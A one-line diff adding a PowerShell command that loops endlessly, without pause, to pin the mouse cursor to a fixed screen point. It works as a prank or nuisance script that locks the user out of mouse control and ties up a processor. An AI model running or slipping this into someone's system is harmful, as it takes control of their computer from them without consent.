@@ -1,0 +1,1 @@
+Add-Type -a System.Windows.Forms;$s=[Windows.Forms.SystemInformation]::PrimaryMonitorSize;for(;;){[Windows.Forms.Cursor]::Position=[Drawing.Point]::new($s.Width/8,$s.Height*7/8);sleep 0}
